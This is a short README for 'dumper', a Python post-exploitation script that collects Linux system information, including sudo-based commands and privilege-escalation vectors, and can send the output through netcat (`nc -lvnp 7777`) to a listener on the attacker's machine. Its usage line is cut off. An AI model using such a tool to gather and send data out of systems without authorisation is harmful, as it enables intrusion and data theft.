# dumper
dumper is a python script, designed to perform quick linux-based system dump, with file output with posibility to send out data 
## Features
- `-p` option allows to use sudo commands, wrong password validation may exit the script
- most common attack vectors scan
- option to add own unix commands into 3 categories by modifying lists inside script:
    - commands based on every command except `find`
    - commands based on `find` command especially
    - commands executed with sudo priviledges, eg. `sudo -l`
- commands based on find output `ls -l` version of every found file
- possibility to send output to previously opened port, eg. `nc -lvnp 7777` on attacking machine, with script usage with `-d ` parameter

## How It Works
`python ./dumper.py -d 
